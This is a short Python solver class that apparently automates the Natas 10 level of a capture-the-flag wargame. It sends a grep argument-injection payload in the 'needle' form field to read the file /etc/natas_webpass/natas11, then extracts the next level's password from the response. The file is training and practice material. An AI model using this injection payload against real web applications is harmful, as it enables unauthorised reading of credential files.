import re
from .base_solver import NatasSolver

class Natas10Solver(NatasSolver):
    def solve(self) -> str:
        try:
            # Use grep to read password file with pattern
            payload = ".* /etc/natas_webpass/natas11 #"
            
            response = self.make_request(
                method="POST",  # Changed to POST to match working solution
                data={"needle": payload, "submit": "Search"}  # Changed to data from params
            )

            # Extract password using the exact pattern
            match = re.findall(r"/etc/natas_webpass/natas11:(.*)", response.text)
            if not match:
                raise ValueError("Could not find password in response")
                
            return match[0].strip()
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas10: {str(e)}")